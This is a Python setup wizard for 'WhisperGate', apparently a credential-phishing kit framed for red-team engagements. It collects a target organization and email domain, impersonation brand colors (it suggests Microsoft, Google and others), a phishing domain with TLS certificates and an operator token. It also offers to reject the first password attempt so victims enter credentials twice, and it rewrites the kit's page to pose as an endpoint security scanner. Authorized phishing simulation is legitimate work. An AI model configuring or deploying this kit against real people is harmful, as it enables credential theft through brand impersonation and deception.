#!/usr/bin/env python3
"""
WhisperGate Setup Wizard
Walks through engagement configuration and updates all files automatically.

Usage:
    python3 setup.py

After running:
    1. SCP your logo to static/images/logo.png
    2. Run: sudo /path/to/venv/bin/python3 WhisperGate.py
"""

import os
import re
import secrets
import sys

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def banner():
    print("""
 __        ___     _                       ____       _       
 \\ \\      / / |__ (_)___ _ __   ___ _ __  / ___| __ _| |_ ___ 
  \\ \\ /\\ / /| '_ \\| / __| '_ \\ / _ \\ '__|| |  _ / _` | __/ _ \\
   \\ V  V / | | | | \\__ \\ |_) |  __/ |   | |_| | (_| | ||  __/
    \\_/\\_/  |_| |_|_|___/ .__/ \\___|_|    \\____|\\__,_|\\__\\___|
                        |_|                                    

    ╔══════════════════════════════════════╗
    ║         ENGAGEMENT SETUP WIZARD      ║
    ╚══════════════════════════════════════╝
    """)


def ask(prompt, default=None, required=True):
    """Prompt the user for input with an optional default."""
    if default:
        display = f"  {prompt} [{default}]: "
    else:
        display = f"  {prompt}: "
    
    while True:
        value = input(display).strip()
        if not value and default:
            return default
        if not value and required:
            print("    ⚠  This field is required.")
            continue
        return value


def ask_yn(prompt, default='y'):
    """Yes/no prompt."""
    suffix = '[Y/n]' if default == 'y' else '[y/N]'
    value = input(f"  {prompt} {suffix}: ").strip().lower()
    if not value:
        return default == 'y'
    return value in ('y', 'yes')


def update_file(filepath, replacements):
    """Apply a list of (pattern, replacement) regex substitutions to a file."""
    full_path = os.path.join(SCRIPT_DIR, filepath)
    if not os.path.exists(full_path):
        print(f"    ⚠  File not found: {filepath}")
        return False
    
    with open(full_path, 'r') as f:
        content = f.read()
    
    for pattern, replacement in replacements:
        content = re.sub(pattern, replacement, content)
    
    with open(full_path, 'w') as f:
        f.write(content)
    
    return True


def main():
    banner()
    
    print("  This wizard will configure WhisperGate for your engagement.")
    print("  Press Enter to accept defaults shown in [brackets].\n")
    print("  ─── Organization ─────────────────────────────────\n")
    
    org_name = ask("Target organization name", default="Contoso")
    email_domain = ask("Target email domain (e.g. @contoso.com)", default="@contoso.com")
    brand_text = ask("Top bar brand text", default="Endpoint Security")
    ref_number = ask("Policy reference number", default="SEC-2024-0847")
    
    print("\n  ─── Branding Colors ──────────────────────────────\n")
    print("    Common brand colors:")
    print("    Microsoft blue: #0078d4    Google blue: #4285f4")
    print("    Slack purple:   #611f69    Salesforce:  #00a1e0")
    print("    Red accent:     #d83b01    Green:       #107c10\n")
    
    primary_color = ask("Primary brand color (hex)", default="#0078d4")
    
    # Generate a hover color (slightly darker)
    try:
        r = int(primary_color[1:3], 16)
        g = int(primary_color[3:5], 16)
        b = int(primary_color[5:7], 16)
        hover_r = max(0, int(r * 0.85))
        hover_g = max(0, int(g * 0.85))
        hover_b = max(0, int(b * 0.85))
        hover_color = f"#{hover_r:02x}{hover_g:02x}{hover_b:02x}"
    except (ValueError, IndexError):
        hover_color = "#106ebe"
    
    print(f"    Auto-generated hover color: {hover_color}")
    
    print("\n  ─── SSL Certificates ─────────────────────────────\n")
    
    domain = ask("Your phishing domain (e.g. secure-scanner.com)", default="secure-scanner.com")
    cert_file = ask("SSL cert path", default=f"/etc/letsencrypt/live/{domain}/fullchain.pem")
    key_file = ask("SSL key path", default=f"/etc/letsencrypt/live/{domain}/privkey.pem")
    
    print("\n  ─── Operator Panel ───────────────────────────────\n")
    
    generated_token = secrets.token_urlsafe(24)
    if ask_yn(f"Generate a random admin token? (suggested: {generated_token})"):
        admin_token = generated_token
    else:
        admin_token = ask("Enter your admin token")
    
    print("\n  ─── Behavior ─────────────────────────────────────\n")
    
    reject_first = ask_yn("Reject first password attempt?", default='y')
    scan_ms = ask("Scan duration in milliseconds", default="12000")
    
    # ── Summary ───────────────────────────────────────
    print("\n  ═══════════════════════════════════════════════════")
    print("  CONFIGURATION SUMMARY")
    print("  ═══════════════════════════════════════════════════\n")
    print(f"    Organization:     {org_name}")
    print(f"    Email domain:     {email_domain}")
    print(f"    Brand text:       {brand_text}")
    print(f"    Reference:        {ref_number}")
    print(f"    Primary color:    {primary_color}")
    print(f"    Hover color:      {hover_color}")
    print(f"    Domain:           {domain}")
    print(f"    Cert file:        {cert_file}")
    print(f"    Key file:         {key_file}")
    print(f"    Admin token:      {admin_token}")
    print(f"    Reject 1st pass:  {reject_first}")
    print(f"    Scan duration:    {scan_ms}ms")
    print()
    
    if not ask_yn("Apply this configuration?"):
        print("\n  Aborted. No files were changed.\n")
        sys.exit(0)
    
    # ── Apply changes ─────────────────────────────────
    print("\n  Applying configuration...\n")
    
    # WhisperGate.py
    py_replacements = [
        (r"EMAIL_DOMAIN\s*=\s*'[^']*'",   f"EMAIL_DOMAIN = '{email_domain}'"),
        (r"ADMIN_TOKEN\s*=\s*'[^']*'",    f"ADMIN_TOKEN = '{admin_token}'"),
        (r"REJECT_FIRST_ATTEMPT\s*=\s*(True|False)", f"REJECT_FIRST_ATTEMPT = {reject_first}"),
        (r"ORG_NAME\s*=\s*'[^']*'",       f"ORG_NAME = '{org_name}'"),
        (r"cert_file\s*=\s*'[^']*'",      f"cert_file = '{cert_file}'"),
        (r"key_file\s*=\s*'[^']*'",       f"key_file = '{key_file}'"),
    ]
    if update_file('WhisperGate.py', py_replacements):
        print("    ✓ WhisperGate.py updated")
    
    # styles.css
    css_replacements = [
        (r"--color-primary:\s*#[0-9a-fA-F]{6}",       f"--color-primary: {primary_color}"),
        (r"--color-primary-hover:\s*#[0-9a-fA-F]{6}",  f"--color-primary-hover: {hover_color}"),
    ]
    if update_file('static/css/styles.css', css_replacements):
        print("    ✓ static/css/styles.css updated")
    
    # index.html — brand text, ref number, scan duration
    html_replacements = [
        (r'(<span class="brand-text">)[^<]*(</span>)',         f'\\1{brand_text}\\2'),
        (r'(<span class="top-bar-ref">)[^<]*(</span>)',        f'\\1Ref: {ref_number}\\2'),
        (r'var SCAN_MS\s*=\s*\d+',                             f'var SCAN_MS = {scan_ms}'),
    ]
    if update_file('templates/index.html', html_replacements):
        print("    ✓ templates/index.html updated")
    
    # ── Done ──────────────────────────────────────────
    print("\n  ═══════════════════════════════════════════════════")
    print("  SETUP COMPLETE")
    print("  ═══════════════════════════════════════════════════\n")
    print("  Remaining manual steps:\n")
    print(f"    1. SCP your logo to the server:")
    print(f"       scp ~/Desktop/logo.png whisper:~/WhisperGate/static/images/logo.png\n")
    print(f"    2. Start WhisperGate:")
    print(f"       sudo /home/ubuntu/WhisperGate/venv/bin/python3 WhisperGate.py\n")
    print(f"    3. Access the operator panel at:")
    print(f"       https://{domain}/operator\n")
    print(f"    4. Your admin token is:")
    print(f"       {admin_token}\n")
    print(f"       Save this — you'll need it to log into the operator panel.\n")


if __name__ == '__main__':
    main()
